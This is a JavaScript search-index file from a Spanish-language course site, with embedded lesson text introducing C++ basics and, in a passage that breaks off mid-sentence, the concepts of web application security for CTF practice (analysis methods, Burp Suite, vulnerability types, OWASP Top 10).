var suggestions=document.getElementById('suggestions');var userinput=document.getElementById('userinput');document.addEventListener('keydown',inputFocus);function inputFocus(e){if(e.keyCode===191){e.preventDefault();userinput.focus();}
if(e.keyCode===27){userinput.blur();suggestions.classList.add('d-none');}}
document.addEventListener('click',function(event){var isClickInsideElement=suggestions.contains(event.target);if(!isClickInsideElement){suggestions.classList.add('d-none');}});document.addEventListener('keydown',suggestionFocus);function suggestionFocus(e){const focusableSuggestions=suggestions.querySelectorAll('a');const focusable=[...focusableSuggestions];const index=focusable.indexOf(document.activeElement);let nextIndex=0;if(e.keyCode===38){e.preventDefault();nextIndex=index>0?index-1:0;focusableSuggestions[nextIndex].focus();}
else if(e.keyCode===40){e.preventDefault();nextIndex=index+1<focusable.length?index+1:index;focusableSuggestions[nextIndex].focus();}}
(function(){var index=new FlexSearch({preset:'score',cache:true,doc:{id:'id',field:['title','description','content',],store:['href','title','description',],},});var docs=[{id:0,href:"/docs/intro/c++/",title:"Entendiendo C++",description:null,content:"\u003cp\u003ePara partir programando, primero debemos entender en qué formato se programa. Para los programas en c++ solo requieres crear un archivo de texto cualquiera, en el editor de texto que elijas (funciona hasta en un block de notas), cuyo nombre termine con la extención \u0026ldquo;.cpp\u0026rdquo; (del inglés \u0026ldquo;cee plus plus\u0026rdquo;). Este archivo contendrá la serie de instrucciones que se ejecutarán paso a paso.\nLo primero que se ejecuta en un archivo cpp será una función a la que llamamos \u0026ldquo;main\u0026rdquo;, cuya notación es:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eTodo lo que esté dentro de los corchetes se irá ejecutanto línea por línea. Para que este programa imprima algo en pantalla, podemos usar el termino \u0026ldquo;std::cout\u0026rdquo;, y para ingresarle un valor usamos los simbolos \u0026ldquo;\u0026laquo;\u0026rdquo;, como un flujo de derecha a izquierda. Por ejemplo, en el caso de que quisieramos hacer un clásico \u0026ldquo;Hola mundo\u0026rdquo; haríamos:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;Hola Mundo\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNotemos que el flujo sigue el sentido del operador, y no funcionaría si se escribe en dirección contraria. Tambien podemos notar que al final de la string hay un \u0026ldquo;\\n\u0026rdquo; que indica al programa el final de la línea a imprimir. Por último colocamos \u0026ldquo;;\u0026rdquo; para que nuestra máquina entienda ese caracter como el fin de la instrucción, es decir, esto acompaña a cada línea en el programa.\u003c/p\u003e\n\u003cp\u003eAhora, podemos intentar \u0026ldquo;hacer funcionar\u0026rdquo; este código, es decir, correr el programa. Para esto, necesitamos compilar este código, pues c++ es un lenguaje compilado, lo que quiere decir que para que un programa funcione tenemos que pasar las líneas escritas de manera legible para un humano a líneas que un computador pueda entender y ejecutar.\u003c/p\u003e\n\u003cp\u003eEste paso de compilación dependerá mucho de las herramientas que uses, y como se haga dependerá tanto del sistema operativo que usas como de los programas que estás usando. Por ejemplo, si lo haces con las herramientas más basicas estarías usando una terminal abierta en la misma carpeta donde se encuentre tu archivo .cpp, y ejecutando \u0026ldquo;g++ miPrograma.cpp\u0026rdquo; si estás en una distribución de linux.\u003c/p\u003e\n\u003cp\u003eIntentar compilar el programa descrito anteriormente fallará pues no reconocerá el termino \u0026ldquo;cout\u0026rdquo;; necesita aprender a usarlo, y para esto escribimos antes del programa:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;iostream\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eQue hace cargar una serie de instrucciones que permiten el paso de entrada y salida de información al programa (Input-Output STREAM). Nuestro programa quedará así:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;iostream\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;Hola Mundo\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ey al compilar nos creará un archivo ejecutable llamado \u0026ldquo;a.out\u0026rdquo;, si usas el comando descrito anteriormente. Al ejecutarlo nos debería imprimir el string \u0026ldquo;Hola mundo\u0026rdquo; antes de quedar a la espera de más instrucciones.\u003c/p\u003e\n\u003cp\u003ePodemos notar que el termino \u0026ldquo;cout\u0026rdquo; viene acompañado de un prefijo \u0026ldquo;std::\u0026rdquo;, el cual nos dice que tal instrucción origina de la librería estandar que importamos con el \u003ciostream\u003e. Esto se debe a que habiendo muchas librerías que incluir en nuestro código, queremos evitar la confusión entre funciones que provengan de diferentes librerías pero con el mismo nombre, es por esto que se le incluye una especie de \u0026ldquo;apellido\u0026rdquo; que lo permite distinguir a partir de su fuente original. Ahora, para evitar estar escribiendo \u0026ldquo;std\u0026rdquo; cada vez que queramos imprimir algo (que ocurre bastante seguido en la programación competitiva) vamos a incluir una línea adicional en nuestro programa, el cual le dirá a la computadora el origen de \u0026ldquo;cout\u0026rdquo;:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"k\"\u003eusing\u003c/span\u003e \u003cspan class=\"k\"\u003enamespace\u003c/span\u003e \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAhora podremos escribir \u0026ldquo;cout\u0026rdquo; en remplazo de \u0026ldquo;std::cout\u0026rdquo; sin problemas. Podemos escribir múltiples líneas\u0026hellip; o incluso darle más valores en una misma línea, algo como esto:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;iostream\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eusing\u003c/span\u003e \u003cspan class=\"k\"\u003enamespace\u003c/span\u003e \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;Hola Mundo\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;Este es mi primer código en c++. \u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;¿No es genial?\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;Así es, mi código número \u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNotemos que un mismo cout puede recibir multiples strings, y estas van a seguir el flujo que indiquen los símbolos \u0026ldquo;\u0026laquo;\u0026rdquo;, imprimiendo una línea tras otra, por lo que es importante notar que si necesito un espacio entre dos valores a imprimir, como es el caso al final de algunas de las nuevas líneas, caso contrario concatenaría cada string una al lado de la otra. En el ejemplo también se muestra el uso de números, el cual la máquina interpreta antes de imprimir por lo que no tiene problemas a la hora de mezclar con las strings.\u003c/p\u003e\n\u003cp\u003eOtra cosa que puedes hacer en c++, tan como en los otros lenguajes de programación, es realizar operaciones aritmeticas. Podemos pedirles cálculos tales como sumas, restas, multiplicaciones y divisiones. Entonces, si tuvieramos un programa como:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;iostream\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eusing\u003c/span\u003e \u003cspan class=\"k\"\u003enamespace\u003c/span\u003e \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eentonces nuestra máquina calcularía el resultado de la operación y luego entregaría una en cada línea. Un detalle a observar es que la separación se produce debido al uso de salto de líneas, no porque estas instrucciones estén en líneas distintas, por ejemplo podríamos escribir las mismas instrucciones en una sola línea, obteniendo el mismo resultado:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;iostream\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eusing\u003c/span\u003e \u003cspan class=\"k\"\u003enamespace\u003c/span\u003e \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSin estos saltos de línea (\u0026quot;\\n\u0026quot;) el programa retornaría todos los dígitos de corrido (\u0026ldquo;292\u0026rdquo;). Aunque equivalentes en su resultado, en programación se usa con más frecuencia la alternativa a este representación al salto de línea, usando \u0026ldquo;endl\u0026rdquo;, la cual se comporta diferente en cuanto al código pero en terminos prácticos no nos incumbe a la hora de programar. El código anterior retornaría lo mismo si tuviera:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;iostream\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eusing\u003c/span\u003e \u003cspan class=\"k\"\u003enamespace\u003c/span\u003e \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\t\u003cspan class=\"n\"\u003ecout\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eendl\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eendl\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eendl\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePara marcar comentarios que aclaren el código, o si desear probar un programa sin que se ejecute una línea, puedes \u0026ldquo;comentar una línea\u0026rdquo;, que es anteponerle dos slashes (\u0026quot;//) para que nuestra máquina ignore el contenido que le siga a esos caracteres.\u003c/p\u003e\n"},{id:1,href:"/docs/apps-web/intro/",title:"Intro a Aplicaciones Web",description:null,content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eWeb es uno de los temas más amplios en las competencias de CTF.\nLos challenges se basan principalmente en la explotación de vulnerabilidades reales en los sistemas,\npero también pueden incorporar elementos de otros temas también, como Stego, OSINT o PWN.\nPara efectos de este curso nos centraremos en la detección y explotación de vulnerabilidades comunes,\nmientras que la resolución de los challenges surgirá casi como un efecto secundario.\u003c/p\u003e\n\u003cp\u003eYa que este tema hace un fuerte uso de vulnerabilidades reales, al practicar para este tipo de challenges\ntambién están estudiando para hacer análisis de seguridad a sitios web de verdad. De hecho,\nel penetration testing, o pentesting, de páginas web es el trabajo más solicitado a los especialistas en seguridad computacional.\nEs más, algunas empresas buscan activamente a gente con habilidades en estos temas por medio de CTFs,\npara luego ofrecerles trabajo.\u003c/p\u003e\n\u003cp\u003eSimilarmente a los otros temas que hemos visto en este curso, las flags de los challenges web pueden estar\nen casi cualquier lado. Desde el código fuente HTML, pasando por parámetros retornados por el\nservidor, y hasta pueden estar escondidas en una base de datos o en un archivo no visible desde internet.\nPero dentro de toda esta inmensidad de posibilidades, ustedes se deben guiar por las vulnerabilidades\ny los recursos ganados al explotarlas.\u003c/p\u003e\n\u003ch2 id=\"análisis-básico-de-aplicaciones-web\"\u003eAnálisis Básico de Aplicaciones Web\u003c/h2\u003e\n\u003cp\u003eEl análisis de aplicaciones web abarca temas muy amplios y se puede volver muy complejo, pero en su objetivo\nfundamental es siempre el mismo: realizar acciones (ya sea leer, crear o modificar datos, ejecutar comandos,\nu obtener privilegios diferentes) las cuales no son deseables por el dueño del sistema. Esto es, \u0026ldquo;hackear\u0026rdquo;\nla página. Existen muchas técnicas, herramientas y procedimientos distintos que ayudan en este proceso,\npero en su forma más básica (similar al debugging de cualquier software),\nesto se divide en análisis estático y análisis dinámico.\u003c/p\u003e\n\u003ch3 id=\"análisis-estático\"\u003eAnálisis Estático\u003c/h3\u003e\n\u003cp\u003eSe refiere al análisis de elementos estáticos de un sitio web, como archivos HTML y JavaScript, código fuente,\nrestricciones de uso para ciertos campos (por ejemplo largo de la entrada, caracteres permitidos, etc).\nUsualmente este es el primer paso para analizar un sitio web, con el cual se empieza a entender el funcionamiento\nprincipal de la página, se encuentran las tecnologías utilizadas y de vez en cuando aparecen ciertos elementos\nque no deberían estar visibles y que divulgan cierta información.\u003c/p\u003e\n\u003cp\u003eEste tipo de análisis es bastante simple y usualmente no se necesita más que un navegador. El más utilizado\nen el área de seguridad es \u003ca href=\"https://www.mozilla.org/en-US/firefox/new/\"\u003eFireFox\u003c/a\u003e, ya que se suele comportar\nun poco mejor con las otras herramientas que se utiliza. En particular, se utiliza las herramientas de\ndesarrollador (Developer Tools), a las cuales pueden acceder presionando F12. Aquí nos interesa principalmente\nel \u003cem\u003eDebugger\u003c/em\u003e para ver las dependencias y diferentes recursos utilizados por el sitio, el \u003cem\u003eInspector\u003c/em\u003e para analizar\nel código fuente HTML, la \u003cem\u003eConsole\u003c/em\u003e en donde pueden aparecer mensajes o información relevante, y el \u003cem\u003eStorage\u003c/em\u003e\nen donde se almacena cookies y otra información de manera local.\u003c/p\u003e\n\u003ch3 id=\"análisis-dinámico\"\u003eAnálisis Dinámico\u003c/h3\u003e\n\u003cp\u003eEl análisis dinámico incluye toda la revisión de requests hechas al servidor, junto a sus respuestas respectivas,\nla generación de requests diferentes a los usualmente utilizados por el servicio, y en general a todo lo que\ntenga que ver con interactuar con el servidor. Aquí es donde se encuentra la gran mayoría de las vulnerabilidades\ny formas de explotar el servicio. La forma de realizar el análisis y sus resultados dependen fuertemente\nde las tecnologías (lenguajes, frameworks, librerías, filtros, etc) usadas en el sitio web.\u003c/p\u003e\n\u003cp\u003ePara hacer esto, las herramientas más típicas son proxies. El más usado es \u003ca href=\"https://portswigger.net/burp/communitydownload\"\u003eBurp Suite Community Edition\u003c/a\u003e,\no \u003ca href=\"https://portswigger.net/burp/pro\"\u003eBurp Suite Professional\u003c/a\u003e si trabajan en una empresa o pueden costearlo.\nEste no solo sirve de proxy, sino que además incluye algunas otras herramientas que ayudan a analizar consultas\ne interactuar con el servidor. Durante este curso lo usaremos bastante, por lo que es recomendado instalarlo,\njunto a algún plugin para redirigir las consultas, como por ejemplo \u003ca href=\"https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/\"\u003eFoxyProxy\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"vulnerabilidades\"\u003eVulnerabilidades\u003c/h2\u003e\n\u003cp\u003eHasta ahora hemos mencionado a las vulnerabilidades, pero no hemos visto qué son. En resumen, una vulnerabilidad\nse refiere a cualquier debilidad que, en teoría, produce comportamiento no deseado en el sistema,\nel cual tiene el potencial de perjudicar a alguno de los agentes involucrados (dueños del sistema, usuarios, terceros,\netc).\u003c/p\u003e\n\u003cp\u003eLa implementación de un ataque que se aprovecha de una vulnerabilidad se denomina explotación o \u003cem\u003eexploit\u003c/em\u003e.\nEl request (o parte del request) que gatilla este exploit al servidor y que causa el comportamiento\nno deseado se llama \u003cem\u003epayload\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eUna mitigación es una contramedida que en teoría elimina una vulnerabilidad, o la vuelve significativamente\nmás difícil de explotar. La implementación de una mitigación se denomina parche o \u003cem\u003epatch\u003c/em\u003e.\u003c/p\u003e\n\u003ch3 id=\"tipos-de-vulnerabilidades\"\u003eTipos de Vulnerabilidades\u003c/h3\u003e\n\u003cp\u003eEn términos generales, las vulnerabilidades surgen por una de estas tres razones:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePor bugs\u003c/strong\u003e: es decir que hay un error en el código y este produce comportamiento inesperado.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePor lógica\u003c/strong\u003e: lo que significa que el diseño de la aplicación en sí es vulnerable. No necesariamente existen bugs.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePor dependencias\u003c/strong\u003e: alguna de las librerías utilizadas tiene una vulnerabilidad que es explotable dentro del sistema.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTener estas diferenciaciones en mente sirve para entender de mejor manera cómo explotar una vulnerabilidad.\nLas vulnerabilidades por bugs usualmente se explotan mediante la generación de errores, o explorando un camino de\ninteracción no previsto por los desarrolladores. En cambio para las vulnerabilidades por lógica es necesario entender\nla arquitectura del servicio y encontrar hoyos en esta. Finalmente, las vulnerabilidades por dependencias suelen\nser explotadas mediante código hecho específicamente para esto, los cuales se pueden encontrar en Github u otros\nrepositorios como Metasploit.\u003c/p\u003e\n\u003ch2 id=\"owasp\"\u003eOWASP\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/\"\u003eThe Open Web Application Security Project\u003c/a\u003e es una organización sin fines de lucro que intenta\nmejorar la seguridad del software en general. Desarrollan diferentes proyectos para ayudar a\nlas personas a generar mejores sistemas y código. Estos comprenden guías de desarrollo y testeo,\ndefiniciones de estándares y herramientas automatizadas, lo cual facilita el desarrollo de software\nseguro y de calidad.\u003c/p\u003e\n\u003ch3 id=\"top-10-web-application-security-risks\"\u003eTop 10 Web Application Security Risks\u003c/h3\u003e\n\u003cp\u003eEl \u003ca href=\"https://owasp.org/www-project-top-ten/\"\u003eOWASP Top 10\u003c/a\u003e es un proyecto que recopila los 10 riesgos de\nseguridad más comunes en aplicaciones web. Estos riesgos usualmente se traducen en vulnerabilidades bajo ciertas\ncondiciones, por lo que es importante que al menos conozcan que existen y entiendan por qué surgen.\nCon la excepción de algunos casos muy particulares, todas las vulnerabilidades que ustedes encuentren\ncorresponderán a uno (o a veces más de uno) de los riesgos en la lista. Estos son:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eInjection\u003c/li\u003e\n\u003cli\u003eBroken Authentication\u003c/li\u003e\n\u003cli\u003eSensitive Data Exposure\u003c/li\u003e\n\u003cli\u003eXML External Entities (XXE)\u003c/li\u003e\n\u003cli\u003eBroken Access Control\u003c/li\u003e\n\u003cli\u003eSecurity Misconfiguration\u003c/li\u003e\n\u003cli\u003eCross-Site Scripting (XSS)\u003c/li\u003e\n\u003cli\u003eInsecure Deserialization\u003c/li\u003e\n\u003cli\u003eUsing Components With Known Vulnerabilities\u003c/li\u003e\n\u003cli\u003eInsufficient Logging \u0026amp; Monitoring\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLa mayoría de los nombres son bastante autodescriptivos, sin embargo si desean conocer estos riesgos\nmás en detalle, por favor visiten el proyecto de OWASP y lean su documentación.\u003c/p\u003e\n\u003ch3 id=\"web-security-testing-guide\"\u003eWeb Security Testing Guide\u003c/h3\u003e\n\u003cp\u003eLa \u003ca href=\"https://owasp.org/www-project-web-security-testing-guide/\"\u003eWeb Security Testing Guide\u003c/a\u003e es una guía que intenta\nestandarizar la forma de realizar pruebas de seguridad a una aplicación web. Es particularmente útil para\nlas personas que quieran seguir en esta área, ya que entra en harto detalle sobre cómo funciona cada ataque\ny de qué forma se puede realizar.\u003c/p\u003e\n\u003ch3 id=\"otros-proyectos-de-owasp\"\u003eOtros Proyectos de OWASP\u003c/h3\u003e\n\u003cp\u003eOtros proyectos de OWASP incluyen:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-dependency-track/\"\u003eDependency Track\u003c/a\u003e: Una herramienta que analiza estáticamente\nlas dependencias de un proyecto y las 